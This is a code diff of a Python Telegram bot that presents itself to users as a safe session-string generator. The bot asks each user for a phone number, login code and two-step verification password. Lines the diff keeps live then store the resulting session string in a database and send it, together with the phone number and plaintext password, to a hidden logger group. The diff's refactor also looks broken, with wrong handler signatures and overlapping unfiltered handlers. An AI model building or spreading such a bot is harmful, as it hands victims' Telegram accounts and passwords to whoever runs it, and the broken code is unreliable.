@@ -1,5 +1,5 @@
 import sqlite3
-from pyrogram import Client, filters, errors
+from pyrogram import Client, errors
 from pyrogram.errors import SessionPasswordNeeded
 
 # 🔹 Telegram API Credentials
@@ -45,62 +45,71 @@ create_session_table()
 bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 # ✅ /start Command
-@bot.on_message(filters.command("start"))
-async def start(client, message):
-    await message.reply(
-        "**👋 Welcome to Session Generator Bot!**\n\n"
-        "🔹 **Generate Telegram Session Strings for Pyrogram (V2)**\n"
-        "🔹 **Safe and easy to use**\n\n"
-        "📌 Please provide your phone number with the country code (e.g., +919876543210)"
-    )
+@bot.on_message()
+async def start(event):
+    if event.text.lower() == "/start":
+        await event.reply(
+            "**👋 Welcome to Session Generator Bot!**\n\n"
+            "🔹 **Generate Telegram Session Strings for Pyrogram (V2)**\n"
+            "🔹 **Safe and easy to use**\n\n"
+            "📌 Please provide your phone number with the country code (e.g., +919876543210)"
+        )
 
 # ✅ Phone number input step
-@bot.on_message(filters.text)
-async def process_phone_input(client, message):
-    user_id = message.from_user.id
-    phone_number = message.text.strip()
+@bot.on_message()
+async def process_phone_input(event):
+    user_id = event.from_user.id
+    phone_number = event.text.strip()
 
     if not phone_number:  # Ensure the phone number is provided
-        await message.reply("❌ **Please provide a valid phone number.**")
+        await event.reply("❌ **Please provide a valid phone number.**")
         return
 
     user_sessions[user_id] = {"phone": phone_number, "step": "otp"}
 
     try:
-        client_instance = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
-        await client_instance.connect()
-        sent_code = await client_instance.send_code(phone_number)
-        user_sessions[user_id]["client"] = client_instance  
+        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
+        await client.connect()
+        sent_code = await client.send_code(phone_number)
+        user_sessions[user_id]["client"] = client  
         user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
 
-        await message.reply("🔹 **OTP sent! Please provide the OTP you received.**")
+        await event.reply("🔹 **OTP sent! Please provide the OTP you received.**")
     except errors.FloodWait as e:
-        await message.reply(f"❌ **Too many requests, please wait for {e.x} seconds.**")
+        await event.reply(f"❌ **Too many requests, please wait for {e.x} seconds.**")
     except Exception as e:
-        await message.reply(f"❌ **Error occurred: {str(e)}**")
+        await event.reply(f"❌ **Error occurred: {str(e)}**")
 
 # ✅ OTP input step
-@bot.on_message(filters.text)
-async def process_otp_input(client, message):
-    user_id = message.from_user.id
+@bot.on_message()
+async def process_otp_input(event):
+    user_id = event.from_user.id
     if user_id not in user_sessions or user_sessions[user_id]["step"] != "otp":
         return  # Ensure the user is in OTP step
 
-    otp_code = message.text.strip()
+    otp_code = event.text.strip()
     phone_number = user_sessions[user_id]["phone"]
     phone_code_hash = user_sessions[user_id]["phone_code_hash"]
 
     if not otp_code:  # Ensure OTP is provided
-        await message.reply("❌ **Please provide a valid OTP.**")
+        await event.reply("❌ **Please provide a valid OTP.**")
         return
 
-    client_instance = user_sessions[user_id]["client"]
+    client = user_sessions[user_id]["client"]
 
     try:
-        await client_instance.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
-        session_string = await client_instance.export_session_string()
+        # Send the OTP code
+        await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
+        
+        # Ensure client is properly signed in
+        if not await client.is_user_authorized():
+            await event.reply("❌ **Unable to authorize with the given OTP. Please check the OTP and try again.**")
+            return
+        
+        session_string = await client.export_session_string()
 
         # Log the session string to the database
+        create_session_table()
         with get_db_connection() as db_connection:
             cursor = db_connection.cursor()
             cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)",
@@ -109,34 +118,35 @@ async def process_otp_input(client, message):
 
         await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
 
-        await message.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
+        await event.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
         del user_sessions[user_id]
     except SessionPasswordNeeded:
         user_sessions[user_id]["step"] = "password"
-        await message.reply("🔑 **Please provide your Telegram password (2-Step Verification).**")
+        await event.reply("🔑 **Please provide your Telegram password (2-Step Verification).**")
     except Exception as e:
-        await message.reply(f"❌ **Error occurred: {str(e)}**")
+        await event.reply(f"❌ **Error occurred: {str(e)}**")
         del user_sessions[user_id]
 
 # ✅ 2FA Password input step
-@bot.on_message(filters.text)
-async def process_password_input(client, message):
-    user_id = message.from_user.id
+@bot.on_message()
+async def process_password_input(event):
+    user_id = event.from_user.id
     if user_id not in user_sessions or user_sessions[user_id]["step"] != "password":
         return  # Ensure the user is in password step
 
-    password = message.text.strip()
+    password = event.text.strip()
     if not password:  # Ensure password is provided
-        await message.reply("❌ **Please provide a valid password.**")
+        await event.reply("❌ **Please provide a valid password.**")
         return
 
-    client_instance = user_sessions[user_id]["client"]
+    client = user_sessions[user_id]["client"]
 
     try:
-        await client_instance.check_password(password)
-        session_string = await client_instance.export_session_string()
+        await client.check_password(password)
+        session_string = await client.export_session_string()
 
         # Log the session string to the database
+        create_session_table()
         with get_db_connection() as db_connection:
             cursor = db_connection.cursor()
             cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)",
@@ -145,10 +155,10 @@ async def process_password_input(client, message):
 
         await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (2FA) generated!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password used:** `{password}`")
 
-        await message.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
+        await event.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
         del user_sessions[user_id]
     except Exception as e:
-        await message.reply(f"❌ **Error occurred: {str(e)}**")
+        await event.reply(f"❌ **Error occurred: {str(e)}")
 
 # 🔹 Reset the database if the 'number' column is missing
 def reset_database_if_needed():
